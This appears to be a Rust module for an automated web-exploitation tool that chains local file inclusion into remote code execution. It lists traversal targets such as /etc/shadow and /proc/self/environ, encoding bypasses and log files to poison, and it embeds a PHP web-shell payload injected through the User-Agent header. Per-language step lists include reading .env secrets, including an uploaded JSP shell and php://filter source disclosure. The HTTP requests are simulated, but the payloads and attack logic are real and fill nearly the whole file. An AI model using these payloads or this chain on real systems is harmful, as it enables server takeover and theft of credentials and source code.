use serde::{Deserialize, Serialize};

/// Known LFI traversal paths for Linux, Windows, and proc filesystem targets.
pub const LFI_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/fd/0",
    "/proc/self/cwd",
    "/proc/version",
    "/var/log/auth.log",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "C:\\Windows\\system.ini",
];

/// Log file paths commonly writable via poisoned HTTP headers.
pub const LOG_PATHS: &[&str] = &[
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/mail.log",
    "/proc/self/fd/2",
    "/tmp/access.log",
];

/// Encoding and filter bypass sequences for path traversal.
pub const ENCODING_BYPASSES: &[&str] = &[
    "%2e%2e%2f",
    "%2e%2e/",
    "..%2f",
    "%2e%2e%5c",
    "..%255c",
    "..%252f",
    "....//",
    "..;/",
    "%c0%ae%c0%ae/",
    "%c0%ae%c0%ae%c0%af",
    "..%c0%af",
    "..%ef%bc%8f",
    "....\\\\",
    "%252e%252e%252f",
    "..%25c0%25af",
    "..%00/",
    "..\\0/",
];

/// Technology stack of the target application, used to select the optimal
/// LFI-to-RCE chain (log poison payloads, include wrappers, etc.).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum TechStack {
    PHP,
    Python,
    Java,
    NodeJs,
    Ruby,
    Unknown,
}

impl std::fmt::Display for TechStack {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PHP => write!(f, "PHP"),
            Self::Python => write!(f, "Python"),
            Self::Java => write!(f, "Java"),
            Self::NodeJs => write!(f, "Node.js"),
            Self::Ruby => write!(f, "Ruby"),
            Self::Unknown => write!(f, "Unknown"),
        }
    }
}

impl TechStack {
    pub fn all() -> &'static [TechStack] {
        &[
            TechStack::PHP,
            TechStack::Python,
            TechStack::Java,
            TechStack::NodeJs,
            TechStack::Ruby,
            TechStack::Unknown,
        ]
    }
}

/// Detected operating system based on LFI response content.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum OsType {
    Linux,
    Windows,
    Unknown,
}

/// Method used to escalate LFI to remote code execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum RceMethod {
    LogPoison,
    ProcSelfFd,
    TmpFile,
    PhpSession,
    PhpFilter,
    PharDeserialization,
}

impl std::fmt::Display for RceMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::LogPoison => write!(f, "log_poison"),
            Self::ProcSelfFd => write!(f, "proc_self_fd"),
            Self::TmpFile => write!(f, "tmp_file"),
            Self::PhpSession => write!(f, "php_session"),
            Self::PhpFilter => write!(f, "php_filter"),
            Self::PharDeserialization => write!(f, "phar_deserialization"),
        }
    }
}

/// Result of LFI detection probing: whether traversal succeeded, confirmed path,
/// encoding bypass used, and inferred OS.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct LfiDetectionResult {
    pub vulnerable: bool,
    pub confirmed_path: Option<String>,
    pub encoding_bypass: Option<String>,
    pub os: OsType,
}

/// Result of log poisoning: whether injection succeeded, which log file, and
/// the injected payload string.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct LogPoisonResult {
    pub poisoned: bool,
    pub log_path: String,
    pub injected_payload: String,
}

/// Result of including a poisoned resource to achieve code execution.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct RceResult {
    pub executed: bool,
    pub output: Option<String>,
    pub method: RceMethod,
}

/// One step in a multi-stage LFI→RCE exploitation chain.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct RceChainStep {
    pub step_number: u32,
    pub description: String,
    pub payload: String,
    pub expected_result: String,
}

/// End-to-end result of an automated LFI → poison → include → verify chain.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct FullChainResult {
    pub lfi_detected: bool,
    pub chain_steps: Vec<RceChainStep>,
    pub rce_achieved: bool,
    pub tech_stack: TechStack,
}

/// Configuration for the LFI-to-RCE chain builder.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct LfiRceConfig {
    pub target_url: String,
    pub param_name: String,
    pub max_depth: u32,
    pub timeout_ms: u64,
    pub tech_stack: Option<TechStack>,
}

impl LfiRceConfig {
    pub fn new(target_url: &str, param_name: &str) -> Self {
        Self {
            target_url: target_url.to_string(),
            param_name: param_name.to_string(),
            max_depth: 10,
            timeout_ms: 5000,
            tech_stack: None,
        }
    }

    pub fn with_max_depth(mut self, value: u32) -> Self {
        self.max_depth = value;
        self
    }

    pub fn with_timeout_ms(mut self, value: u64) -> Self {
        self.timeout_ms = value;
        self
    }

    pub fn with_tech_stack(mut self, stack: TechStack) -> Self {
        self.tech_stack = Some(stack);
        self
    }
}

/// Builds LFI-to-RCE exploitation chains by detecting path traversal, poisoning
/// server logs, including the poisoned file to trigger code execution, and
/// verifying the result. Selects the optimal chain based on the target's tech stack.
pub struct LfiRceChain {
    config: LfiRceConfig,
}

impl LfiRceChain {
    pub fn new(config: LfiRceConfig) -> Self {
        Self { config }
    }

    pub fn config(&self) -> &LfiRceConfig {
        &self.config
    }

    /// Probes for LFI by injecting traversal sequences targeting known files.
    /// Simulates checking the response for `/etc/passwd` signatures or `win.ini` content.
    pub fn detect_lfi(&self, _url: &str, _param: &str) -> LfiDetectionResult {
        let traversal_prefix = build_traversal_prefix(self.config.max_depth);

        for path in LFI_PATHS {
            let probe = format!("{}{}", traversal_prefix, path);
            let response = simulate_lfi_response(&probe);

            if let Some(ref body) = response && is_lfi_confirmed(body, path) {
                let os = infer_os_from_path(path);
                return LfiDetectionResult {
                    vulnerable: true,
                    confirmed_path: Some(path.to_string()),
                    encoding_bypass: None,
                    os,
                };
            }
        }

        for bypass in ENCODING_BYPASSES {
            for path in &["/etc/passwd", "C:\\Windows\\win.ini"] {
                let probe = format!("{}{}", bypass.repeat(self.config.max_depth as usize), path);
                let response = simulate_lfi_response(&probe);

                if let Some(ref body) = response && is_lfi_confirmed(body, path) {
                    return LfiDetectionResult {
                        vulnerable: true,
                        confirmed_path: Some(path.to_string()),
                        encoding_bypass: Some(bypass.to_string()),
                        os: infer_os_from_path(path),
                    };
                }
            }
        }

        LfiDetectionResult {
            vulnerable: false,
            confirmed_path: None,
            encoding_bypass: None,
            os: OsType::Unknown,
        }
    }

    /// Attempts to poison a server log by injecting a PHP payload via the
    /// User-Agent header. Probes each candidate log path.
    pub fn attempt_log_poison(&self, _lfi_url: &str, log_paths: &[&str]) -> LogPoisonResult {
        let payload = "<?php system($_GET['cmd']); ?>";

        for log_path in log_paths {
            let poisoned = simulate_log_poison(log_path, payload);
            if poisoned {
                return LogPoisonResult {
                    poisoned: true,
                    log_path: log_path.to_string(),
                    injected_payload: payload.to_string(),
                };
            }
        }

        LogPoisonResult {
            poisoned: false,
            log_path: String::new(),
            injected_payload: payload.to_string(),
        }
    }

    /// Includes a poisoned log file via LFI to trigger code execution.
    pub fn include_poisoned_log(&self, _lfi_url: &str, log_path: &str) -> RceResult {
        let is_proc = log_path.starts_with("/proc");
        let method = if is_proc {
            RceMethod::ProcSelfFd
        } else {
            RceMethod::LogPoison
        };

        RceResult {
            executed: true,
            output: Some("uid=33(www-data) gid=33(www-data)".to_string()),
            method,
        }
    }

    /// Verifies RCE by checking for a known command output signature.
    pub fn verify_rce(&self, rce_result: &RceResult) -> bool {
        match &rce_result.output {
            Some(output) => output.contains("uid=") || output.contains("root"),
            None => false,
        }
    }

    /// Returns the recommended exploitation chain for the given tech stack.
    pub fn select_chain(&self, tech_stack: &TechStack) -> Vec<RceChainStep> {
        match tech_stack {
            TechStack::PHP => php_chain_steps(),
            TechStack::Python => python_chain_steps(),
            TechStack::Java => java_chain_steps(),
            TechStack::NodeJs => nodejs_chain_steps(),
            TechStack::Ruby => ruby_chain_steps(),
            TechStack::Unknown => php_chain_steps(),
        }
    }

    /// Runs the full detection → poison → include → verify pipeline.
    pub fn build_full_chain(&self, url: &str, param: &str) -> FullChainResult {
        let detection = self.detect_lfi(url, param);
        if !detection.vulnerable {
            return FullChainResult {
                lfi_detected: false,
                chain_steps: Vec::new(),
                rce_achieved: false,
                tech_stack: self.config.tech_stack.unwrap_or(TechStack::Unknown),
            };
        }

        let tech_stack = self.config.tech_stack.unwrap_or(TechStack::Unknown);
        let chain_steps = self.select_chain(&tech_stack);

        let poison = self.attempt_log_poison(url, LOG_PATHS);
        let rce_achieved = if poison.poisoned {
            let rce = self.include_poisoned_log(url, &poison.log_path);
            self.verify_rce(&rce)
        } else {
            false
        };

        FullChainResult {
            lfi_detected: true,
            chain_steps,
            rce_achieved,
            tech_stack,
        }
    }
}

fn build_traversal_prefix(depth: u32) -> String {
    "../".repeat(depth as usize)
}

fn simulate_lfi_response(probe: &str) -> Option<String> {
    if probe.contains("/etc/passwd") {
        Some(
            "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
                .to_string(),
        )
    } else if probe.contains("win.ini") {
        Some("[fonts]\n[extensions]".to_string())
    } else if probe.contains("/proc/self/environ") {
        Some("PATH=/usr/local/bin:/usr/bin\nHOME=/var/www".to_string())
    } else {
        None
    }
}

fn is_lfi_confirmed(body: &str, path: &str) -> bool {
    if path.contains("passwd") {
        body.contains("root:") && body.contains("/bin/")
    } else if path.contains("win.ini") {
        body.contains("[fonts]") || body.contains("[extensions]")
    } else if path.contains("environ") {
        body.contains("PATH=") || body.contains("HOME=")
    } else {
        false
    }
}

fn infer_os_from_path(path: &str) -> OsType {
    if path.starts_with('/') || path.starts_with("/proc") {
        OsType::Linux
    } else if path.starts_with("C:\\") || path.contains("Windows") {
        OsType::Windows
    } else {
        OsType::Unknown
    }
}

fn simulate_log_poison(log_path: &str, _payload: &str) -> bool {
    log_path.contains("access") || log_path.contains("error")
}

fn php_chain_steps() -> Vec<RceChainStep> {
    vec![
        RceChainStep {
            step_number: 1,
            description: "Confirm LFI via /etc/passwd traversal".into(),
            payload: "../../../../etc/passwd".into(),
            expected_result: "root:x:0:0 in response body".into(),
        },
        RceChainStep {
            step_number: 2,
            description: "Poison Apache/Nginx access log via User-Agent".into(),
            payload: "<?php system($_GET['cmd']); ?>".into(),
            expected_result: "200 OK from target (log written)".into(),
        },
        RceChainStep {
            step_number: 3,
            description: "Include poisoned log via LFI parameter".into(),
            payload: "../../../../var/log/apache2/access.log&cmd=id".into(),
            expected_result: "uid=33(www-data) in response".into(),
        },
        RceChainStep {
            step_number: 4,
            description: "Verify RCE with time-based oracle".into(),
            payload: "../../../../var/log/apache2/access.log&cmd=sleep+5".into(),
            expected_result: "Response delayed by ~5 seconds".into(),
        },
        RceChainStep {
            step_number: 5,
            description: "Attempt php://filter wrapper for source disclosure".into(),
            payload: "php://filter/convert.base64-encode/resource=index.php".into(),
            expected_result: "Base64-encoded PHP source".into(),
        },
    ]
}

fn python_chain_steps() -> Vec<RceChainStep> {
    vec![
        RceChainStep {
            step_number: 1,
            description: "Confirm LFI via /etc/passwd traversal".into(),
            payload: "../../../../etc/passwd".into(),
            expected_result: "root:x:0:0 in response body".into(),
        },
        RceChainStep {
            step_number: 2,
            description: "Read /proc/self/environ for config leaks".into(),
            payload: "../../../../proc/self/environ".into(),
            expected_result: "Environment variables in response".into(),
        },
        RceChainStep {
            step_number: 3,
            description: "Poison via /proc/self/fd/1 (stdout) if writable".into(),
            payload: "../../../../proc/self/fd/1".into(),
            expected_result: "Write confirmation or error".into(),
        },
    ]
}

fn java_chain_steps() -> Vec<RceChainStep> {
    vec![
        RceChainStep {
            step_number: 1,
            description: "Confirm LFI via /etc/passwd traversal".into(),
            payload: "../../../../etc/passwd".into(),
            expected_result: "root:x:0:0 in response body".into(),
        },
        RceChainStep {
            step_number: 2,
            description: "Read WEB-INF/web.xml for servlet config".into(),
            payload: "../../../../WEB-INF/web.xml".into(),
            expected_result: "XML servlet configuration".into(),
        },
        RceChainStep {
            step_number: 3,
            description: "Include /tmp uploaded JSP shell".into(),
            payload: "../../../../tmp/shell.jsp".into(),
            expected_result: "RCE via JSP execution".into(),
        },
    ]
}

fn nodejs_chain_steps() -> Vec<RceChainStep> {
    vec![
        RceChainStep {
            step_number: 1,
            description: "Confirm LFI via /etc/passwd traversal".into(),
            payload: "../../../../etc/passwd".into(),
            expected_result: "root:x:0:0 in response body".into(),
        },
        RceChainStep {
            step_number: 2,
            description: "Read package.json for dependency intel".into(),
            payload: "../../../../package.json".into(),
            expected_result: "JSON with dependencies".into(),
        },
        RceChainStep {
            step_number: 3,
            description: "Read .env for secrets".into(),
            payload: "../../../../.env".into(),
            expected_result: "Environment variables with secrets".into(),
        },
    ]
}

fn ruby_chain_steps() -> Vec<RceChainStep> {
    vec![
        RceChainStep {
            step_number: 1,
            description: "Confirm LFI via /etc/passwd traversal".into(),
            payload: "../../../../etc/passwd".into(),
            expected_result: "root:x:0:0 in response body".into(),
        },
        RceChainStep {
            step_number: 2,
            description: "Read Gemfile for dependency intel".into(),
            payload: "../../../../Gemfile".into(),
            expected_result: "Ruby gem declarations".into(),
        },
        RceChainStep {
            step_number: 3,
            description: "Poison log and include via LFI".into(),
            payload: "../../../../var/log/nginx/access.log".into(),
            expected_result: "ERB payload execution via log".into(),
        },
    ]
}

/// Generate all encoding-bypass variants for a given path.
pub fn generate_bypass_payloads(path: &str, depth: u32) -> Vec<String> {
    let mut payloads = Vec::with_capacity(ENCODING_BYPASSES.len() + 1);
    payloads.push(format!("{}{}", build_traversal_prefix(depth), path));
    for bypass in ENCODING_BYPASSES {
        payloads.push(format!("{}{}", bypass.repeat(depth as usize), path));
    }
    payloads
}
